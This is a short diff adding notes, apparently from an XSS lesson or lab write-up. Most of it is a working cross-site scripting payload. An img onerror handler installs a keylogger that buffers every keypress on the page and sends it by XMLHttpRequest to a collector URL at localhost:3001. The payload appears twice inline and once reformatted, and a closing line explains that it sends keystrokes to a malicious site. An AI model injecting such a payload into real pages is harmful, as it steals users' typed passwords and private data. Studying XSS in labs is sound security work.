@@ -1,0 +1,36 @@
+Here in this case out injected script is,
+
+<img src="does-not-exist" onerror='var timeout; var buffer = ""; document.querySelector("bod
+y").addEventListener("keypress", (event) => { if (event.which !== 0) { clearTimeout(timeout);
+buffer += String.fromCharCode(event.which); timeout = setTimeout(() => { var xhr = new XMLHttp
+Request(); var uri = "http://localhost:3001/keys?data="+ encodeURIComponent(buffer); xhr.open
+("GET", uri); xhr.send(); buffer = ""; }, 400); }});'\n/>
+
+
+var timeout;
+var buffer = "";
+document.querySelector("body").addEventListener("keypress", (event) => {
+    if (event.which !== 0) {
+        clearTimeout(timeout);
+        buffer += String.fromCharCode(event.which);
+        timeout = setTimeout(() => {
+            var xhr = new XMLHttpRequest();
+            var uri = "http://localhost:3001/keys?data=" + encodeURIComponent(buffer);
+            xhr.open("GET", uri);
+            xhr.send();
+            buffer = "";
+        }, 400);
+    }
+}
+);
+
+
+<img src="does-not-exist" onerror='var timeout; var buffer = ""; document.querySelector("bod
+y").addEventListener("keypress", (event) => { if (event.which !== 0) { clearTimeout(timeout);
+buffer += String.fromCharCode(event.which); timeout = setTimeout(() => { var xhr = new XMLHttp
+Request(); var uri = "http://localhost:3001/keys?data="+ encodeURIComponent(buffer); xhr.open
+("GET", uri); xhr.send(); buffer = ""; }, 400); }});'\n/>
+
+
+- This will send any key u pressed to malicious site url.
+
